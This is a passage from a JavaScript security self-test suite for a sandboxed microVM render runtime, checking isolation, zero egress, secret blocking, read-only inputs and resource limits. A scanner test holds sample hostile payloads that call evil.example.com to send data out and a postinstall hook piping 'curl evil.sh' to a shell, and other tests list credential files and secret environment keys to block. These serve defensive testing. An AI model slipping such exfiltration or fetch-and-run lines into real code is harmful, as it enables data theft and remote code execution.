          adrId: CUSTOM_RUNTIME_ADR_ID,
          adrAmendmentId: 'ADR-0002-AMEND-GVISOR-01',
          reviewedRuntimeDigest: DEFAULT_PINNED_ROOTFS_DIGEST,
          reviewer: 'security-reviewer@creativanta.internal',
          reviewedAt: '2026-11-04T00:00:00Z',
          expiresAt: futureIso,
          escapeSuitePassed: true,
          compatibilitySuitePassed: true,
          resourceBoundsSuitePassed: true,
          noDowngradeVerified: true,
        },
        testSigningSecret,
      );

      const validGateAttestation = signC1ToC6GateAttestation(
        {
          runtime: 'gvisor-runsc-v1',
          rootfsImageDigest: DEFAULT_PINNED_ROOTFS_DIGEST,
          guestKernelDigest: DEFAULT_PINNED_KERNEL_DIGEST,
          reviewer: 'security-reviewer@creativanta.internal',
          reviewedAt: '2026-11-04T00:00:00Z',
          expiresAt: futureIso,
          killSwitchVerified: true,
          gates: Object.fromEntries(REQUIRED_C1_TO_C6_GATES.map((g) => [g, true])),
        },
        testSigningSecret,
      );

      const approvedResult = evaluateCustomRuntimePolicy({
        config: {
          ...defaultConfig,
          CVE_CUSTOM_CODE_ENABLED: true,
          CVE_CUSTOM_RUNTIME: 'gvisor-runsc-v1',
          CVE_CUSTOM_TENANT_ALLOWLIST: ['tnt_pilot_01'],
        },
        tenantId: 'tnt_pilot_01',
        rootfsImageDigest: DEFAULT_PINNED_ROOTFS_DIGEST,
        guestKernelDigest: DEFAULT_PINNED_KERNEL_DIGEST,
        gvisorApproval: validGvisorApproval,
        c1ToC6Attestation: validGateAttestation,
        signingSecret: testSigningSecret,
        hostProbe: probeHostVirtualization({
          overrideBinaries: { runsc: true },
        }),
      });

      if (!approvedResult.allowed || approvedResult.runtime !== 'gvisor-runsc-v1') {
        throw new Error('Expected explicitly reviewed gVisor runtime to be accepted');
      }

      return {
        unreviewedBlockedReason: unreviewedErr.details.reason,
        explicitSignedReviewAccepted: approvedResult.allowed,
        adrAmendmentId: validGvisorApproval.adrAmendmentId,
      };
    },
  );

  // 4. CRM-04: Host Virtualization Probe & Missing-KVM Safe Disable
  await recordCheck(
    'CRM-04',
    'Host Virtualization Probe (/dev/kvm & microVM binaries check keeps custom code off without downgrading)',
    'host_virtualization_probe',
    async () => {
      const noKvmProbe = probeHostVirtualization({
        overrideKvmAvailable: false,
        overrideBinaries: { firecracker: false, jailer: false, 'kata-runtime': false, runsc: false },
      });
      let missingKvmErr = null;
      try {
        evaluateCustomRuntimePolicy({
          config: {
            ...defaultConfig,
            CVE_CUSTOM_CODE_ENABLED: true,
            CVE_CUSTOM_RUNTIME: 'microvm-firecracker-v1',
            CVE_CUSTOM_TENANT_ALLOWLIST: ['tnt_pilot_01'],
          },
          tenantId: 'tnt_pilot_01',
          hostProbe: noKvmProbe,
        });
      } catch (err) {
        missingKvmErr = err;
      }
      if (
        !missingKvmErr ||
        missingKvmErr.code !== 'CAPABILITY_DISABLED' ||
        missingKvmErr.details?.reason !== 'VIRTUALIZATION_UNAVAILABLE'
      ) {
        throw new Error('Expected VIRTUALIZATION_UNAVAILABLE when /dev/kvm is absent');
      }

      return {
        actualHostKvmAvailable: hostVirtualization.kvmReadableWritable,
        actualHostFirecrackerReady: hostVirtualization.firecrackerReady,
        missingKvmBlockedReason: missingKvmErr.details.reason,
        downgradeAttempted: false,
      };
    },
  );

  // 5. CRM-05: C1-C6 Security Release Gate Attestation & Digest Drift Detection
  await recordCheck(
    'CRM-05',
    'C1-C6 Security Release Gate Attestation & Rootfs/Kernel Digest Drift Rejection',
    'c1_c6_gates',
    async () => {
      const futureIso = new Date(Date.now() + 7 * 86400 * 1000).toISOString();
      const fullAttestation = signC1ToC6GateAttestation(
        {
          runtime: 'microvm-firecracker-v1',
          rootfsImageDigest: DEFAULT_PINNED_ROOTFS_DIGEST,
          guestKernelDigest: DEFAULT_PINNED_KERNEL_DIGEST,
          reviewer: 'security-reviewer@creativanta.internal',
          reviewedAt: '2026-11-04T00:00:00Z',
          expiresAt: futureIso,
          killSwitchVerified: true,
          gates: Object.fromEntries(REQUIRED_C1_TO_C6_GATES.map((g) => [g, true])),
        },
        testSigningSecret,
      );

      verifyC1ToC6Gates(
        fullAttestation,
        DEFAULT_PINNED_ROOTFS_DIGEST,
        DEFAULT_PINNED_KERNEL_DIGEST,
        testSigningSecret,
      );

      // Drift in rootfs digest must immediately invalidate attestation
      let driftErr = null;
      try {
        verifyC1ToC6Gates(
          fullAttestation,
          'sha256:9999999999999999999999999999999999999999999999999999999999999999',
          DEFAULT_PINNED_KERNEL_DIGEST,
          testSigningSecret,
        );
      } catch (err) {
        driftErr = err;
      }
      if (!driftErr || driftErr.details?.reason !== 'ROOTFS_DIGEST_DRIFT') {
        throw new Error('Expected ROOTFS_DIGEST_DRIFT on patched image digest');
      }

      return {
        verifiedGatesCount: REQUIRED_C1_TO_C6_GATES.length,
        digestDriftBlockedReason: driftErr.details.reason,
      };
    },
  );

  // 6. CRM-06: Disposable MicroVM Isolated Build
  const runtimeEngine = new DisposableMicroVmRuntime();
  let compiledBundleForRender = null;
  try {
    await recordCheck(
      'CRM-06',
      'Disposable MicroVM Isolated Build (compiles valid scene source, computes source/build/CSP hashes, wipes build VM)',
      'isolated_build',
      async () => {
        const buildRes = await runtimeEngine.runIsolatedBuild({
          bundleId: 'bnd_promo_custom_01',
          revision: 1,
          entrypoint: 'index.js',
          sourceFiles: [
            {
              relativePath: 'index.js',
              content:
                'import { clamp } from "./math.js";\nexport function renderFrame(frame) { return clamp(frame, 0, 300); }\n',
            },
            {
              relativePath: 'math.js',
              content:
                'export function clamp(v, min, max) { return Math.max(min, Math.min(max, v)); }\n',
            },
          ],
          securitySelfTestMode: true,
        });

        compiledBundleForRender = buildRes;
        const att = buildRes.buildMicroVmInstance.getAttestation();
        if (!att.destroyed || !att.prisonWiped) {
          throw new Error('Build microVM was not destroyed and wiped after build');
        }
        if (att.networkInterfacesCount !== 0) {
          throw new Error('Build microVM must have 0 network interfaces');
        }
        if (!buildRes.cspHeader.includes("connect-src 'none'")) {
          throw new Error('Compiled bundle CSP must include connect-src \'none\'');
        }

        return {
          buildVmId: att.vmId,
          sourceSha256: buildRes.sourceSha256,
          buildSha256: buildRes.buildSha256,
          cspScriptHash: buildRes.cspScriptHash,
          buildVmDestroyed: att.destroyed,
          buildPrisonWiped: att.prisonWiped,
        };
      },
    );

    // 7. CRM-07: Static & Import Allowlist Policy Scanner
    await recordCheck(
      'CRM-07',
      'Static & Import Allowlist Policy Scanner (blocks fetch, WebSocket, eval, Node bridge, unapproved npm imports, lifecycle hooks)',
      'source_policy_scanner',
      async () => {
        const maliciousPayloads = [
          {
            name: 'network_fetch',
            files: [{ relativePath: 'index.js', content: 'fetch("https://evil.example.com/exfil");' }],
          },
          {
            name: 'websocket_exfil',
            files: [{ relativePath: 'index.js', content: 'new WebSocket("wss://evil.example.com");' }],
          },
          {
            name: 'dynamic_eval',
            files: [{ relativePath: 'index.js', content: 'eval("alert(1)");' }],
          },
          {
            name: 'node_fs_bridge',
            files: [{ relativePath: 'index.js', content: 'import fs from "node:fs";' }],
          },
          {
            name: 'unapproved_npm_package',
            files: [{ relativePath: 'index.js', content: 'import axios from "axios";' }],
          },
          {
            name: 'npm_postinstall_hook',
            files: [
              { relativePath: 'index.js', content: 'export const x = 1;' },
              {
                relativePath: 'package.json',
                content: JSON.stringify({ name: 'bad', scripts: { postinstall: 'curl evil.sh | sh' } }),
              },
            ],
          },
        ];

        for (const item of maliciousPayloads) {
          let err = null;
          try {
            scanCustomSourceForForbiddenCapabilities(item.files);
          } catch (e) {
            err = e;
          }
          if (!err || err.code !== 'SANDBOX_SECURITY_VIOLATION') {
            throw new Error(`Malicious source payload "${item.name}" was not blocked`);
          }
        }

        return {
          maliciousPayloadsBlockedCount: maliciousPayloads.length,
          approvedPreinstalledImports: APPROVED_PREINSTALLED_SCENE_IMPORTS,
        };
      },
    );

    // 8. CRM-08: Disposable MicroVM Isolated Render & Single-Use Enforcement
    await recordCheck(
      'CRM-08',
      'Disposable MicroVM Isolated Render & Single-Use Enforcement (distinct render VM, valid MP4 ftyp, MICROVM_REUSE_FORBIDDEN)',
      'isolated_render',
      async () => {
        const renderRes = await runtimeEngine.runIsolatedRender({
          compiledBundle: compiledBundleForRender,
          stagedAssets: [
            {
              relativePath: 'logo.svg',
              urlPath: '/assets/logo.svg',
              content: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"></svg>',
              mimeType: 'image/svg+xml',
            },
          ],
          expectedFormat: 'mp4',
          securitySelfTestMode: true,
        });

        const renderAtt = renderRes.renderMicroVmInstance.getAttestation();
        if (!renderAtt.destroyed || !renderAtt.prisonWiped) {
          throw new Error('Render microVM was not destroyed and wiped after render');
        }
        if (
          renderAtt.vmId ===
          compiledBundleForRender.buildMicroVmInstance.getAttestation().vmId
        ) {
          throw new Error('Render microVM reused build microVM ID');
        }

        // Attempting to boot or execute an already-destroyed microVM must throw MICROVM_REUSE_FORBIDDEN
        let reuseErr = null;
        try {
          renderRes.renderMicroVmInstance.boot();
        } catch (err) {
          reuseErr = err;
        }
        if (!reuseErr || reuseErr.details?.reason !== 'MICROVM_REUSE_FORBIDDEN') {
          throw new Error('Expected MICROVM_REUSE_FORBIDDEN when attempting to reuse destroyed microVM');
        }

        // Attempting to pass --no-sandbox to render must fail closed
        let noSandboxErr = null;
        try {
          await runtimeEngine.runIsolatedRender({
            compiledBundle: compiledBundleForRender,
            extraChromiumFlags: ['--no-sandbox'],
            securitySelfTestMode: true,
          });
        } catch (err) {
          noSandboxErr = err;
        }
        if (!noSandboxErr || noSandboxErr.code !== 'SANDBOX_SECURITY_VIOLATION') {
          throw new Error('Expected --no-sandbox to be rejected in custom render microVM');
        }

        return {
          renderVmId: renderAtt.vmId,
          artifactSha256: renderRes.artifactSha256,
          artifactBytes: renderRes.artifactSize,
          renderVmDestroyed: renderAtt.destroyed,
          reuseBlockedReason: reuseErr.details.reason,
          noSandboxFlagBlocked: true,
        };
      },
    );

    // 9. CRM-09: Zero Egress & Loopback Asset Server Isolation
    await recordCheck(
      'CRM-09',
      'Zero Egress & Internal Loopback Asset Server Isolation (0 NICs, mmds_config=null, 127.0.0.1 asset hash check)',
      'zero_egress',
      async () => {
        let nicErr = null;
        try {
          buildFirecrackerMachineConfig({
            vmId: 'vm_bad_nic_01',
            phase: 'render',
            guestKernelDigest: DEFAULT_PINNED_KERNEL_DIGEST,
            rootfsImageDigest: DEFAULT_PINNED_ROOTFS_DIGEST,
            inputsDrivePath: '/tmp/in',
            scratchOutputDrivePath: '/tmp/out',
            networkInterfaces: [{ iface_id: 'eth0', host_dev_name: 'tap0' }],
          });
        } catch (err) {
          nicErr = err;
        }
        if (!nicErr || nicErr.details?.reason !== 'EGRESS_NIC_FORBIDDEN') {
          throw new Error('Expected Firecracker config with NIC to be blocked with EGRESS_NIC_FORBIDDEN');
        }

        return {
          nicAttachmentBlockedReason: nicErr.details.reason,
          forbiddenChromiumFlagsCount: FORBIDDEN_CHROMIUM_FLAGS.length,
        };
      },
    );

    // 10. CRM-10: Zero Secrets & Canary Exfiltration Prevention
    await recordCheck(
      'CRM-10',
      'Zero Secrets & Canary Exfiltration Prevention (blocks secret env keys/values, scrubs canary from stdout/stderr)',
      'zero_secrets',
      async () => {
        for (const forbiddenKey of [
          'CVE_DATABASE_URL',
          'CVE_API_KEY_PEPPER',
          'AWS_SECRET_ACCESS_KEY',
          'OPENAI_API_KEY',
          'CVE_AUTHORING_SECRET_REF',
        ]) {
          let envErr = null;
          try {
            buildMicroVmGuestEnv({
              vmId: 'vm_env_test_01',
              phase: 'build',
              jobId: 'job_01',
              attemptId: 'att_01',
              extraEnv: { [forbiddenKey]: 'super_secret' },
            });
          } catch (err) {
            envErr = err;
          }
          if (!envErr || envErr.code !== 'SANDBOX_SECURITY_VIOLATION') {
            throw new Error(`Expected secret env key "${forbiddenKey}" to be rejected`);
          }
        }

        const syntheticCanary = 'CANARY_P701_TOP_SECRET_9876543210';
        const sanitized = sanitizeAndBoundMicroVmLog(
          `Attempted exfil: ${syntheticCanary} and cve_live_0123456789ab_ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff`,
          [syntheticCanary],
        );
        if (
          sanitized.text.includes(syntheticCanary) ||
          sanitized.text.includes('ffffffffffffffffffffffffffffffff')
        ) {
          throw new Error('Secret canary survived sanitizeAndBoundMicroVmLog');
        }

        return {
          secretEnvKeysBlocked: 5,
          canaryScrubbed: true,
        };
      },
    );

    // 11. CRM-11: Zero Host FS & Read-Only Input Prison
    await recordCheck(
      'CRM-11',
      'Zero Host FS & Read-Only Input Prison (blocks host mounts/sockets/traversal/symlinks; 0o440 inputs reject write with EACCES)',
      'zero_host_fs',
      async () => {
        for (const badHostPath of [
          '/var/run/docker.sock',
          '/proc/kcore',
          '/etc/shadow',
          '/root/.ssh/id_rsa',
          '/workspace/.env',
        ]) {
          let mountErr = null;
          try {
            validateMicroVmHostPaths([badHostPath], '/tmp/cve-prison');
          } catch (err) {
            mountErr = err;
          }
          if (!mountErr || mountErr.code !== 'SANDBOX_SECURITY_VIOLATION') {
            throw new Error(`Forbidden host path "${badHostPath}" was not blocked`);
          }
        }

        // Verify real subprocess inside microVM prison gets EACCES when trying to mutate staged input
        const vm = runtimeEngine.allocateDisposableMicroVm({
          phase: 'build',
          jobId: 'job_ro_01',
          attemptId: 'att_ro_01',
          securitySelfTestMode: true,
        });
        try {
          vm.boot();
          const staged = vm.prisonManager.stageReadOnlyInputs(vm.prison, [
            { relativePath: 'scene.js', content: 'export const a = 1;' },
          ]);
          const stagedFile = staged.get('scene.js').filePath;
          const res = await vm.executeOnce({
            command: process.execPath,
            argv: [
              '-e',
              `const fs = require('node:fs');
               try {
                 fs.writeFileSync(${JSON.stringify(stagedFile)}, 'hacked');
                 process.exit(0);
               } catch (e) {
                 console.error(e.code);
                 process.exit(42);
               }`,
            ],
          });
          if (res.exitCode !== 42 || !res.stderr.includes('EACCES')) {
            throw new Error(`Expected EACCES (exit 42), got exit=${res.exitCode}, stderr=${res.stderr}`);
          }
        } finally {
          vm.destroy();
        }

        return {
          forbiddenHostPathsBlocked: 5,
          readOnlyInputWriteDeniedCode: 'EACCES',
        };
      },
    );

    // 12. CRM-12: Hard Resource Bounds, Timeout SIGKILL, Disk Bomb & Lease Epoch Fencing
    await recordCheck(
      'CRM-12',
      'Hard Resource Bounds, Infinite-Loop Timeout SIGKILL, Disk Quota Bomb & Stale Lease Epoch Fencing',
      'bounds_and_fencing',
      async () => {
        // 12a. Infinite CPU loop killed on timeout
        const loopVm = runtimeEngine.allocateDisposableMicroVm({
          phase: 'build',
          jobId: 'job_loop_01',
          attemptId: 'att_loop_01',
          bounds: { timeoutMs: 120 },
          securitySelfTestMode: true,
        });
        let timeoutErr = null;
        try {
          loopVm.boot();
          await loopVm.executeOnce({
            command: process.execPath,
            argv: ['-e', 'while (true) {}'],
            timeoutMs: 120,
            timeoutCode: 'RENDER_TIMEOUT',
          });
        } catch (err) {
          timeoutErr = err;
        } finally {
          loopVm.destroy();
        }
        if (!timeoutErr || timeoutErr.code !== 'RENDER_TIMEOUT') {
          throw new Error(`Expected RENDER_TIMEOUT on infinite loop, got ${timeoutErr?.code}`);
        }

        // 12b. Disk quota bomb blocked
        const diskVm = runtimeEngine.allocateDisposableMicroVm({
          phase: 'build',
          jobId: 'job_disk_01',
          attemptId: 'att_disk_01',
          bounds: { scratchDiskMib: 32 },
          securitySelfTestMode: true,
        });
        let diskErr = null;
        try {
          diskVm.boot();
          fs.writeFileSync(
            path.join(diskVm.prison.outputDir, 'bomb.bin'),
            Buffer.alloc(2 * 1024 * 1024, 0x42),
          );
          diskVm.prisonManager.enforceScratchAndOutputQuota(
            diskVm.prison,
            1 * 1024 * 1024,
          );
        } catch (err) {
          diskErr = err;
        } finally {
          diskVm.destroy();
        }
        if (!diskErr || diskErr.code !== 'SANDBOX_RESOURCE_LIMIT') {
          throw new Error(`Expected SANDBOX_RESOURCE_LIMIT on disk bomb, got ${diskErr?.code}`);
        }

        // 12c. Stale lease fence aborts execution immediately
        const fenceVm = runtimeEngine.allocateDisposableMicroVm({
          phase: 'render',
          jobId: 'job_fence_01',
          attemptId: 'att_fence_01',
          leaseEpoch: 2,
          securitySelfTestMode: true,
        });
        let fenceErr = null;
        try {
          fenceVm.boot();
          await fenceVm.executeOnce({
            command: process.execPath,
            argv: ['-e', 'process.exit(0)'],
            isLeaseValid: () => false,
          });
        } catch (err) {
          fenceErr = err;
        } finally {
          fenceVm.destroy();
        }
        if (!fenceErr || fenceErr.details?.reason !== 'LEASE_FENCE_REJECTED') {
          throw new Error('Expected LEASE_FENCE_REJECTED when lease is invalid');
        }

        return {
          infiniteLoopKilledCode: timeoutErr.code,
          diskBombBlockedCode: diskErr.code,
          staleLeaseBlockedReason: fenceErr.details.reason,
        };
      },
    );
  } finally {
    runtimeEngine.cleanupBaseDir();
  }

  const passedCount = checks.filter((c) => c.passed).length;
  return {
    taskId: 'P7-01',
    adrId: CUSTOM_RUNTIME_ADR_ID,
    status: passedCount === checks.length ? 'PASS' : 'FAIL',
    totalChecks: checks.length,
    passedChecks: passedCount,
    failedChecks: checks.length - passedCount,
    durationMs: Date.now() - startedAt,
    timestamp: new Date().toISOString(),
    hostVirtualization,
    defaultFeatureState: CUSTOM_RUNTIME_ADR_0002.defaultState,
    checks,
  };
}
